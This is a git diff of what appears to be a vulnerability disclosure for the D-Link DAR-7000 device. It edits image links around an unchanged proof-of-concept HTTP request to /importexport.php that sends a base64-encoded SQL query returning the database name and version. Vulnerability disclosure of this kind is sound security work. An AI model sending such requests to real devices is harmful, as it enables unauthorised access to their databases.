@@ -4,7 +4,8 @@ official： http://www.dlink.com.cn/
 version:DAR-7000
 
 Vulnerability Path ：/importexport.php
-![Uploading 图片.png…]()
+<img width="743" alt="图片" src="https://github.com/llixixi/cve/assets/144869546/47c12a81-4b76-4f9c-895f-6cd979eb4b80">
+
 poc：
 ```
 GET /importexport.php?sql=c2VsZWN0IDEsZGF0YWJhc2UoKSx2ZXJzaW9uKCk=&type=exportexcelbysql HTTP/1.1
@@ -22,7 +23,6 @@ Te: trailers
 Connection: close
 
 ```
+<img width="752" alt="图片" src="https://github.com/llixixi/cve/assets/144869546/47988d78-26a0-4071-995c-9593c6b9b320">
 
-Construct POC and successfully obtain database name and version
-![Uploading 图片.png…]()
 
